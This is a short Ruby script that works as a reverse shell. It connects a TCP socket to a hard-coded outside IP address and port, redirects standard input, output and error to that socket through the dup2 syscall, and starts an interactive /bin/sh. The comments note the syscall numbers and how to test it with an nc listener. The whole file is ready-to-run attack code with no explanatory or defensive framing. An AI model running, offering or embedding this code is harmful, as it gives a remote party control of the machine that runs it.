#!/usr/bin/env ruby
# syscall 33 = dup2 on 64-bit Linux
# syscall 63 = dup2 on 32-bit Linux
# test with nc -lvp 1337 

require 'socket'

s = Socket.new 2,1
s.connect Socket.sockaddr_in 10101, '159.65.200.160'

[0,1,2].each { |fd| syscall 33, s.fileno, fd }
exec '/bin/sh -i'
